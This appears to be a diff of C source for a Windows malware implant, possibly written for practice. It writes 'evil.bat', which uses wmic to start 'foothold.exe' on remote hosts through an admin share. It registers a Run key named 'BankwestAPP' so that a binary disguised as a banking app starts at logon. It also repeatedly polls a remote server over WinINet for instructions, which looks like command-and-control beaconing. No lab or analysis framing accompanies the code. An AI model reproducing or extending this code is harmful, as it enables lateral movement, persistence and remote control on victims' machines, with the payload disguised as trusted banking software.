@@ -12,7 +12,7 @@ int main()
 {
 	const char* dirpath = "c:\\Users\\saurav\\Temp";
 	const char* filename = "c:\\Users\\saurav\\Temp\\evil.bat";
-    const char* filecontent = "wmic /node:@\'c:\\Users\\saurav\\Temp\\computer.txt\' process call create \'\\\\SauravWindowsVi\\c$\\Users\\saurav\\Desktop\\foothold.exe\'";
+    	const char* filecontent = "wmic /node:@\'c:\\Users\\saurav\\Temp\\computer.txt\' process call create \'\\\\SauravWindowsVi\\c$\\Users\\saurav\\Desktop\\foothold.exe\'";
 
 
 //Create Directory
@@ -43,44 +43,24 @@ int main()
     
 //Set registry runkey Value - point to bankwestapp.exe
 
-
-	//char dwdata [] = "bankwestapp.exe";
-
-
 	HKEY hkey;
 	LPCSTR set_string_value = "c:\\Users\\Public\\Temp\\bankwestapp.exe";
 	//const char set_string_value [] = {'b','a','n','k','w','e','s','t','\0'};
-
 	//char* subkeyname = "BankwestAPP";
 
 	RegOpenKeyExW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hkey); //open registry key handle.
-
-	/*
-	LSTATUS RegSetValueExW(
-		[in]           HKEY       hKey,
-		[in, optional] LPCWSTR    lpValueName,
-					DWORD      Reserved,
-		[in]           DWORD      dwType,
-		[in]           const BYTE *lpData,
-		[in]           DWORD      cbData
-	);
-	*/
-	RegSetValueExA(hkey, "BankwestAPP", 0, REG_SZ, (const BYTE*)set_string_value, strlen(set_string_value)+1);
-	//RegSetKeyValueA(hkey, "Run", "BankwestApp", REG_MULTI_SZ, set_string_value, sizeof(REG_MULTI_SZ));
-	
+	RegSetValueExA(hkey, "BankwestAPP", 0, REG_SZ, (const BYTE*)set_string_value, strlen(set_string_value)+1);	
 	RegCloseKey(hkey);
 
-	//Create a schtask - to run the filecontent.
+//Create a schtask - to run the filecontent.
 
+//Create a persistent windows service. 
 
-
-	//Create a persistent windows service. 
-
-	//Check for instruction
+//Check for instruction
 	HINTERNET hInternet, hConnect, hRequest;
-    BOOL bResult;
-    DWORD dwBytesRead;
-    char buffer[4096];
+    	BOOL bResult;
+    	DWORD dwBytesRead;
+    	char buffer[4096];
 	int i;
 	
 	for (i = 0; i < 10; i++)
@@ -109,16 +89,11 @@ int main()
 			}
 		} while (bResult && dwBytesRead > 0);
 		Sleep(3000);
-
 		// Clean up
 		InternetCloseHandle(hRequest);
 		InternetCloseHandle(hConnect);
 		InternetCloseHandle(hInternet);
 		
 	}
-	
-
-	
 	return 0;
-
 }
